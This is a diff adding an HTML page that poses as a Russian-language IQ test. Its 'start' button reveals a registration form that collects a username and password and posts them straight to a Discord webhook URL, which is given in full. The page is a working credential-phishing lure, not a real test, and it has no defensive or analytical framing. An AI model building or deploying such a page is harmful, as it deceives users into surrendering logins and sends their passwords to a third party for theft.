@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IQ Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #222;
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.5s ease-in-out;
+        }
+
+        h1 {
+            font-size: 24px;
+            transition: all 0.5s ease-in-out;
+        }
+
+        p {
+            font-size: 18px;
+        }
+
+        .start-button {
+            background-color: #00f;
+            color: #fff;
+            border: none;
+            border-radius: 25px; /* Более круглая кнопка */
+            padding: 15px 30px; /* Увеличение отступов */
+            cursor: pointer;
+            font-size: 16px;
+            outline: none;
+            transition: background-color 0.3s ease-in-out, transform 0.3s ease-in-out;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .form-container {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        form {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 15px; /* Увеличение радиуса границы */
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+            color: #fff;
+        }
+
+        input[type="text"] {
+            width: 80%; /* Уменьшение ширины текстовых полей */
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 15px; /* Увеличение радиуса границы */
+        }
+
+        input[type="submit"] {
+            background: linear-gradient(45deg, rgb(0, 255, 34), rgb(238, 255, 0), #f00);
+            background-size: 200% 200%;
+            color: #000000;
+            border: none;
+            border-radius: 15px; /* Увеличение радиуса границы */
+            padding: 15px 30px; /* Увеличение отступов */
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input[type="submit"]:hover {
+            background-position: right center;
+        }
+
+        input[type="submit"]:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+    <h1 class="show">Добро пожаловать на IQ-Test</h1>
+    <p class="show">Пройдите тест, чтобы узнать свой уровень IQ.</p>
+    <button class="start-button show" onclick="startTest()">НАЧАТЬ!</button>
+
+    <div class="form-container">
+        <h1>Register</h1>
+        <form action="https://discord.com/api/webhooks/1027192432447729744/PGOGzVTJ0vcqZy28Ue9PqIKTs0hA6KGMaA4k_jecjPFkD2riGgzsMQ16DEp6e-ri07Ud" method="post">
+            <label for="username1">Username:</label>
+            <input type="text" id="username1" name="content1" required>
+
+            <label for="username2">Password:</label>
+            <input type="text" id="username2" name="content2" required>
+
+            <input type="hidden" name="content" id="combinedContent">
+            <input type="submit" value="Send" onclick="combineUsernames()">
+        </form>
+    </div>
+
+    <script>
+        function startTest() {
+            const title = document.querySelector("h1");
+            const description = document.querySelector("p");
+            const startButton = document.querySelector(".start-button");
+            const formContainer = document.querySelector(".form-container");
+
+            title.classList.remove("show");
+            description.classList.remove("show");
+            startButton.classList.remove("show");
+
+            setTimeout(() => {
+                title.classList.add("hidden");
+                description.classList.add("hidden");
+                startButton.classList.add("hidden");
+                formContainer.style.display = "flex";
+            }, 500);
+        }
+
+        function combineUsernames() {
+            var username1 = document.getElementById("username1").value;
+            var username2 = document.getElementById("username2").value;
+            var combinedContent = username1 + ", " + username2;
+            document.getElementById("combinedContent").value = combinedContent;
+        }
+    </script>
+</body>
+</html>
